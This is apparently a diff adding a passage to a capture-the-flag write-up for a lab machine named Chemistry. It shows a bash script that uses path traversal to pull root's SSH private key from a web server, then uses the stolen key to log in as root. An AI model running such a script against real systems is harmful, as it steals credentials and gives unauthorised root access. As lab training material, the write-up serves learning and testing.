@@ -190,3 +190,50 @@ done
 dcd8cb65b360a30011ac3579082605b7
 ```
 
+
+```
+[★]$ vi exploit.sh
+#!/bin/bash
+
+url="http://localhost:8787"
+string="../"
+payload="/assets/"
+file="root/.ssh/id_rsa" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+	if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+
+[★]$ ./exploit.sh
+```
+[+] Testing with /assets/../root/.ssh/id_rsa
+	Status code --> 404
+[+] Testing with /assets/../../root/.ssh/id_rsa
+	Status code --> 404
+[+] Testing with /assets/../../../root/.ssh/id_rsa
+	Status code --> 200
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+<SNIP>
+
+-----END OPENSSH PRIVATE KEY-----
+
+[★]$ vi  id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+<SNIP>
+
+-----END OPENSSH PRIVATE KEY-----
+
+[★]$ chmod 600 id_rsa
+[★]$ ssh -i id_rsa root@chemistry.htb
+root@chemistry:/home/rosa# cat user.txt
+```
